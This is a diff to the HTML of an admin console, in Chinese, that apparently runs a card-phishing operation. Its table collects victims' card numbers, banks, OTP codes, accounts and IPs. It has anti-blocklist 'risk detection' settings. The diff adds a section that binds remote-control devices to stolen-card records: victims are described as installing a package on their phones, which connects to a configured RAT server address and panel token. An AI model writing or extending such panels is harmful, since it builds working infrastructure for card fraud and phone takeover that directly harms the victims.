@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="theme-color" content="#17191f">
   <title>Gateway Console</title>
-  <link rel="stylesheet" href="/styles.css?v=8">
+  <link rel="stylesheet" href="/styles.css?v=9">
 </head>
 <body>
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
@@ -94,11 +94,12 @@
             <label>关键字<input name="keyword" placeholder="卡号 / IP / 账号"></label>
             <label>状态<select name="status"><option value="">全部</option><option value="1">已提交</option><option value="2">已付卡</option><option value="0">未提交</option></select></label>
             <button class="primary" type="submit">查询</button>
+            <button class="secondary" type="button" id="orderSyncDevice">⇄ 同步设备</button>
             <button class="secondary" type="button" id="orderExport">⬇ 导出 TXT</button>
             <button class="danger-link" type="button" id="orderClear" style="border:1px solid var(--red);border-radius:5px;padding:6px 14px;font-weight:700">🗑 清空数据</button>
           </form>
           <div class="table-wrap">
-            <table><thead><tr><th>编号</th><th>时间</th><th>站点</th><th>域名</th><th>账号</th><th>卡号</th><th>品牌 / 银行</th><th>OTP</th><th>状态</th><th>IP</th><th>明细</th></tr></thead><tbody id="orderBody"></tbody></table>
+            <table><thead><tr><th>编号</th><th>时间</th><th>站点</th><th>域名</th><th>账号</th><th>卡号</th><th>品牌 / 银行</th><th>OTP</th><th>状态</th><th>IP</th><th>设备</th><th>明细</th></tr></thead><tbody id="orderBody"></tbody></table>
           </div>
           <div class="table-foot"><span id="orderCount">共 0 条</span><button id="orderPrev" class="secondary small">上一页</button><span id="orderPage">1</span><button id="orderNext" class="secondary small">下一页</button></div>
         </section>
@@ -159,6 +160,19 @@
             <div class="block-heading"><div><h3>防红配置</h3><p>IPRegistry API Key 供源码配置中的风险识别使用。</p></div><a href="https://dashboard.ipregistry.co/overview" target="_blank" rel="noreferrer">获取 API Key ↗</a></div>
             <label class="switch-row"><span><b>启用 IPRegistry 检测</b><small>需要有效的 API Key</small></span><input id="ipregistry_enabled" type="checkbox"><i></i></label>
             <label class="field"><span id="ipregistryKeyLabel">API Key（剩余积分：未配置）</span><input id="ipregistry_api_key" type="password" placeholder="输入 IPRegistry API Key" autocomplete="off"></label>
+          </section>
+
+          <section class="content-block span-two">
+            <div class="block-heading"><div><h3>远控设备对照</h3><p>按「同 IP + 时间窗」把远控上线的设备绑到订单上：访客用自己手机访问前台、装包上线，IP 一般不变。</p></div></div>
+            <div class="field-grid">
+              <label class="field"><span>远控地址</span><input id="remote_url" type="url" placeholder="http://107.149.55.7:8080" autocomplete="off"><small>yuankong 服务端地址，末尾不带斜杠</small></label>
+              <label class="field"><span>面板 Token</span><input id="remote_token" type="password" placeholder="panelToken" autocomplete="off"><small>远控 config.json 里的 panelToken</small></label>
+              <label class="field"><span>匹配时间窗（分钟）</span><input id="device_match_window" type="number" min="1" max="1440" value="30"><small>设备首次上线必须落在访客提交后这么多分钟内</small></label>
+            </div>
+            <div class="client-test-actions">
+              <button id="deviceSyncBtn" class="secondary" type="button">立即同步一次</button>
+              <span id="deviceSyncResult" class="client-rule-help"></span>
+            </div>
           </section>
 
           <section class="content-block span-two">
@@ -249,6 +263,6 @@
     </form>
   </dialog>
   <div id="mobileBackdrop" class="backdrop"></div>
-  <script src="/app.js?v=15"></script>
+  <script src="/app.js?v=16"></script>
 </body>
 </html>
